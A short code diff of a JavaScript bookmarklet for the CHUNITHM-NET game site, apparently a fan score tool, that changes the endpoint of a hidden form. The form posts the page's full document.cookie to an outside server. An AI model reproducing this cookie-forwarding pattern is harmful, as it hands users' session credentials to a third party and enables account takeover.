@@ -4,7 +4,7 @@ javascript:(function(){
         throw Error();
     }
     window.name = 'CHUNITHM ■ CHUNITHM-NET';
-    var html = '<form method="post" action="https://akashisn.info/test/test.php" id="postjump" target=_brunk style="display: none;"><input type="hidden" name="userid" value="' + document.cookie + '" ></form>';
+    var html = '<form method="post" action="https://akashisn.info/chunithm/chunithm.php" id="postjump" target=_brunk style="display: none;"><input type="hidden" name="userid" value="' + document.cookie + '" ></form>';
     $("body").append(html);
     $('#postjump').submit();
     $('#postjump').remove();
